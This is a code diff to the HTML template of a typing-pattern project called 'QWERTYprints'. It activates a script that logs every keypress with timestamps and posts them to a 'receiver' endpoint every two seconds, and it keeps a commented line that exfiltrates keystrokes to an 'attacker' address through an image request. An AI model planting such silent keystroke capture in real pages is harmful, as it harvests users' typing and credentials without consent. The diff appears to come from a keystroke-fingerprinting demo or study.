@@ -2,73 +2,37 @@
 <script type="text/javascript">
 var buffer = [];
 
-// document.onkeypress = function(e) {
-//     var timestamp = Date.now() | 0;
-//     var stroke = {
-//         k: e.key,
-//         t: timestamp
-//     };
-//     buffer.push(stroke);
-// }
+document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp
+    };
+    buffer.push(stroke);
+}
 
-// window.setInterval(function() {
-//     if (buffer.length > 0) {
-//         $.post("receiver", buffer, function(){
+window.setInterval(function() {
+    if (buffer.length > 0) {
+        $.post("receiver", buffer, function(){
             
-//         });
-//         // var data = encodeURIComponent(JSON.stringify(buffer));
-//         // new Image().src = attacker + data;
-//         buffer = [];
-//         // event.preventDefault();
-//     }
-// }, 2000);
-var cars = [
-	{ "make":"Porsche", "model":"911S" },
-	{ "make":"Mercedes-Benz", "model":"220SE" },
-	{ "make":"Jaguar","model": "Mark VII" }
-];
-
-window.onload = function() {
-	// setup the button click
-	document.getElementById("theButton").onclick = function() {
-		doWork()
-	};
-}
-
-function doWork() {
-	// ajax the JSON to the server
-	$.post("receiver", cars, function(){
-
-	});
-	// stop link reloading the page
- event.preventDefault();
-}
+        });
+        // var data = encodeURIComponent(JSON.stringify(buffer));
+        // new Image().src = attacker + data;
+        buffer = [];
+        // event.preventDefault();
+    }
+}, 2000);
 
 </script>
 <html>
     <head>
-        <title>{{ title }} - QWERTYprints</title>
+        <title>QWERTYprints</title>
     </head>
-    <a href="" id="theButton">Click Me</a>
+    <a href="" id="I Do nothing">Click Me</a>
     <body>
         <h1>Hello, user No. {{ user}}!</h1>
-        <h2>Please type the paragraph in the box below:</h2>
-        <p>I really didn't know what to do for a few months. I felt that I had let the previous generation of
-            entrepreneurs down - that I had dropped the baton as it was being passed to me. I met with David
-            Packard and Bob Noyce and tried to apologize for screwing up so badly. I was a very public failure, and I
-            even thought about running away from the valley. But something slowly began to dawn on me - I still
-            loved what I did. The turn of events at Apple had not changed that one bit. I had been rejected, but I
-            was still in love. And so I decided to start over.
-            I didn't see it then, but it turned out that getting fired from Apple was the best thing that could have
-            ever happened to me. The heaviness of being successful was replaced by the lightness of being a
-            beginner again, less sure about everything. It freed me to enter one of the most creative periods of my
-            life.
-            During the next five years, I started a company named NeXT, another company named Pixar, and fell in
-            love with an amazing woman who would become my wife. Pixar went on to create the world's first
-            computer animated feature film, Toy Story, and is now the most successful animation studio in the
-            world. In a remarkable turn of events, Apple bought NeXT, I returned to Apple, and the technology we
-            developed at NeXT is at the heart of Apple's current renaissance. And Laurene and I have a wonderful
-            family together.</p>
+        <h2>Please enter user number in url and hit ENTER</h2>
+        <p>Please pick a user between 1 and 75</p>
         <textarea id="texas" rows="10" cols="60"></textarea>
     </body>
 </html>
